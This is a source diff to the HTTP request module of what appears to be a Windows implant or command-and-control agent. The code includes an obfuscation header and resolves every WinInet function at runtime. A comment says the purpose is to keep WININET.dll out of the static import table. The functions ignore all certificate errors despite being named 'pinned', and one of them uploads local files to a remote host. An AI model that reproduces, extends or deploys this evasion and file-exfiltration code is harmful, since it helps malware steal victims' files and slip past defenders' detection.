@@ -5,8 +5,11 @@ Copyright (c) 2020 4B4DB4B3
 
 #include "Requests.h"
 #include "Obf.h"
+#include "WinInetDyn.h"
 
-// Parse "host:port" or plain "host" → fills host_out and returns port (default 443)
+// All WinInet calls go through function pointers resolved at runtime.
+// WININET.dll therefore does NOT appear in the PE static import table.
+
 static INTERNET_PORT ParseHost(const char* url, char* host_out, size_t host_sz) {
     const char* colon = strrchr(url, ':');
     if (colon && colon != url) {
@@ -25,46 +28,51 @@ static INTERNET_PORT ParseHost(const char* url, char* host_out, size_t host_sz) 
     return INTERNET_DEFAULT_HTTPS_PORT;
 }
 
-// Accept self-signed / mismatched certs on a request handle
 static void IgnoreCertErrors(HINTERNET hReq) {
     DWORD f = SECURITY_FLAG_IGNORE_UNKNOWN_CA
             | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
             | SECURITY_FLAG_IGNORE_CERT_CN_INVALID
             | SECURITY_FLAG_IGNORE_WRONG_USAGE;
-    InternetSetOption(hReq, INTERNET_OPTION_SECURITY_FLAGS, &f, sizeof(f));
+    g_InternetSetOption(hReq, INTERNET_OPTION_SECURITY_FLAGS, &f, sizeof(f));
 }
 
 std::string Requests::GetRequestPinned(const char* url, const char* useragent, const char* path, const char* /*expectedCN*/) {
+    InitWinInet();
+    if (!g_InternetOpenA) return "";
+
     char host[256] = {};
     INTERNET_PORT port = ParseHost(url, host, sizeof(host));
 
-    HINTERNET hSocket = InternetOpenA(useragent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, NULL);
+    HINTERNET hSocket = g_InternetOpenA(useragent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, NULL);
     if (!hSocket) return "";
 
-    HINTERNET hConn = InternetConnectA(hSocket, host, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
-    if (!hConn) { InternetCloseHandle(hSocket); return ""; }
+    HINTERNET hConn = g_InternetConnectA(hSocket, host, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
+    if (!hConn) { g_InternetCloseHandle(hSocket); return ""; }
 
-    HINTERNET hReq = HttpOpenRequestA(hConn, "GET", path, NULL, NULL, 0,
-                                      INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE |
-                                      INTERNET_FLAG_SECURE  | INTERNET_FLAG_IGNORE_CERT_CN_INVALID |
-                                      INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 1);
-    if (!hReq) { InternetCloseHandle(hConn); InternetCloseHandle(hSocket); return ""; }
+    HINTERNET hReq = g_HttpOpenRequestA(hConn, "GET", path, NULL, NULL, 0,
+                                        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE |
+                                        INTERNET_FLAG_SECURE  | INTERNET_FLAG_IGNORE_CERT_CN_INVALID |
+                                        INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 1);
+    if (!hReq) { g_InternetCloseHandle(hConn); g_InternetCloseHandle(hSocket); return ""; }
     IgnoreCertErrors(hReq);
 
     std::string result;
-    if (HttpSendRequestA(hReq, NULL, 0, NULL, 0)) {
+    if (g_HttpSendRequestA(hReq, NULL, 0, NULL, 0)) {
         BYTE buf[1024]; DWORD nr = 0;
-        while (InternetReadFile(hReq, buf, sizeof(buf), &nr) && nr > 0)
+        while (g_InternetReadFile(hReq, buf, sizeof(buf), &nr) && nr > 0)
             result.append((char*)buf, nr);
     }
-    InternetCloseHandle(hReq);
-    InternetCloseHandle(hConn);
-    InternetCloseHandle(hSocket);
+    g_InternetCloseHandle(hReq);
+    g_InternetCloseHandle(hConn);
+    g_InternetCloseHandle(hSocket);
     return result;
 }
 
 std::string Requests::PostFilePinned(const char* url, const char* useragent, const char* path,
                                       const char* /*expectedCN*/, const char* localFilePath) {
+    InitWinInet();
+    if (!g_InternetOpenA) return "";
+
     HANDLE hFile = CreateFileA(localFilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
     if (hFile == INVALID_HANDLE_VALUE) return "";
 
@@ -100,85 +108,89 @@ std::string Requests::PostFilePinned(const char* url, const char* useragent, con
     INTERNET_PORT port = ParseHost(url, host, sizeof(host));
 
     std::string result;
-    HINTERNET hSocket = InternetOpenA(useragent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, NULL);
+    HINTERNET hSocket = g_InternetOpenA(useragent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, NULL);
     if (!hSocket) return "";
 
-    HINTERNET hConn = InternetConnectA(hSocket, host, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
-    if (!hConn) { InternetCloseHandle(hSocket); return ""; }
+    HINTERNET hConn = g_InternetConnectA(hSocket, host, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
+    if (!hConn) { g_InternetCloseHandle(hSocket); return ""; }
 
-    HINTERNET hReq = HttpOpenRequestA(hConn, "POST", path, NULL, NULL, 0,
-                                      INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE |
-                                      INTERNET_FLAG_SECURE  | INTERNET_FLAG_IGNORE_CERT_CN_INVALID |
-                                      INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 1);
+    HINTERNET hReq = g_HttpOpenRequestA(hConn, "POST", path, NULL, NULL, 0,
+                                        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE |
+                                        INTERNET_FLAG_SECURE  | INTERNET_FLAG_IGNORE_CERT_CN_INVALID |
+                                        INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 1);
     if (hReq) {
         IgnoreCertErrors(hReq);
-        if (HttpSendRequestA(hReq, contentType.c_str(), (DWORD)contentType.size(), body.data(), bodyLen)) {
+        if (g_HttpSendRequestA(hReq, contentType.c_str(), (DWORD)contentType.size(), body.data(), bodyLen)) {
             BYTE buf[1024]; DWORD nr = 0;
-            while (InternetReadFile(hReq, buf, sizeof(buf), &nr) && nr > 0)
+            while (g_InternetReadFile(hReq, buf, sizeof(buf), &nr) && nr > 0)
                 result.append((char*)buf, nr);
         }
-        InternetCloseHandle(hReq);
+        g_InternetCloseHandle(hReq);
     }
-    InternetCloseHandle(hConn);
-    InternetCloseHandle(hSocket);
+    g_InternetCloseHandle(hConn);
+    g_InternetCloseHandle(hSocket);
     return result;
 }
 
 void Requests::PostJsonPinned(const char* url, const char* useragent, const char* path,
                               const char* /*expectedCN*/, const char* json_body) {
-    if (!json_body || !json_body[0]) return;
+    InitWinInet();
+    if (!g_InternetOpenA || !json_body || !json_body[0]) return;
 
     DWORD bodyLen = (DWORD)strlen(json_body);
     char host[256] = {};
     INTERNET_PORT port = ParseHost(url, host, sizeof(host));
 
-    HINTERNET hSocket = InternetOpenA(useragent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, NULL);
+    HINTERNET hSocket = g_InternetOpenA(useragent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, NULL);
     if (!hSocket) return;
 
-    HINTERNET hConn = InternetConnectA(hSocket, host, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
-    if (!hConn) { InternetCloseHandle(hSocket); return; }
+    HINTERNET hConn = g_InternetConnectA(hSocket, host, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
+    if (!hConn) { g_InternetCloseHandle(hSocket); return; }
 
-    HINTERNET hReq = HttpOpenRequestA(hConn, "POST", path, NULL, NULL, 0,
-                                      INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE |
-                                      INTERNET_FLAG_SECURE  | INTERNET_FLAG_IGNORE_CERT_CN_INVALID |
-                                      INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 1);
+    HINTERNET hReq = g_HttpOpenRequestA(hConn, "POST", path, NULL, NULL, 0,
+                                        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE |
+                                        INTERNET_FLAG_SECURE  | INTERNET_FLAG_IGNORE_CERT_CN_INVALID |
+                                        INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 1);
     if (hReq) {
         IgnoreCertErrors(hReq);
         const char* ct = "Content-Type: application/json";
-        HttpSendRequestA(hReq, ct, (DWORD)strlen(ct), (LPVOID)json_body, bodyLen);
-        InternetCloseHandle(hReq);
+        g_HttpSendRequestA(hReq, ct, (DWORD)strlen(ct), (LPVOID)json_body, bodyLen);
+        g_InternetCloseHandle(hReq);
     }
-    InternetCloseHandle(hConn);
-    InternetCloseHandle(hSocket);
+    g_InternetCloseHandle(hConn);
+    g_InternetCloseHandle(hSocket);
 }
 
 std::string Requests::GetRequest(const char* url, const char* useragent, const char* path, const char* ContentType) {
+    InitWinInet();
+    if (!g_InternetOpenA) return "";
+
     char host[256] = {};
     INTERNET_PORT port = ParseHost(url, host, sizeof(host));
 
-    HINTERNET hSocket = InternetOpenA(useragent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, NULL);
+    HINTERNET hSocket = g_InternetOpenA(useragent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, NULL);
     if (!hSocket) return "";
 
-    HINTERNET hConn = InternetConnectA(hSocket, host, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
-    if (!hConn) { InternetCloseHandle(hSocket); return ""; }
+    HINTERNET hConn = g_InternetConnectA(hSocket, host, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
+    if (!hConn) { g_InternetCloseHandle(hSocket); return ""; }
 
     const char* reqPath = (path && path[0]) ? path : NULL;
-    HINTERNET hReq = HttpOpenRequestA(hConn, "GET", reqPath, NULL, NULL, 0,
-                                      INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE |
-                                      INTERNET_FLAG_SECURE  | INTERNET_FLAG_IGNORE_CERT_CN_INVALID |
-                                      INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 1);
-    if (!hReq) { InternetCloseHandle(hConn); InternetCloseHandle(hSocket); return ""; }
+    HINTERNET hReq = g_HttpOpenRequestA(hConn, "GET", reqPath, NULL, NULL, 0,
+                                        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE |
+                                        INTERNET_FLAG_SECURE  | INTERNET_FLAG_IGNORE_CERT_CN_INVALID |
+                                        INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 1);
+    if (!hReq) { g_InternetCloseHandle(hConn); g_InternetCloseHandle(hSocket); return ""; }
     IgnoreCertErrors(hReq);
 
     std::string result;
     const char* ct = (ContentType && ContentType[0]) ? ContentType : NULL;
-    if (HttpSendRequestA(hReq, ct, ct ? (DWORD)strlen(ct) : 0, NULL, 0)) {
+    if (g_HttpSendRequestA(hReq, ct, ct ? (DWORD)strlen(ct) : 0, NULL, 0)) {
         BYTE buf[1024]; DWORD nr = 0;
-        while (InternetReadFile(hReq, buf, sizeof(buf), &nr) && nr > 0)
+        while (g_InternetReadFile(hReq, buf, sizeof(buf), &nr) && nr > 0)
             result.append((char*)buf, nr);
     }
-    InternetCloseHandle(hReq);
-    InternetCloseHandle(hConn);
-    InternetCloseHandle(hSocket);
+    g_InternetCloseHandle(hReq);
+    g_InternetCloseHandle(hConn);
+    g_InternetCloseHandle(hSocket);
     return result;
 }
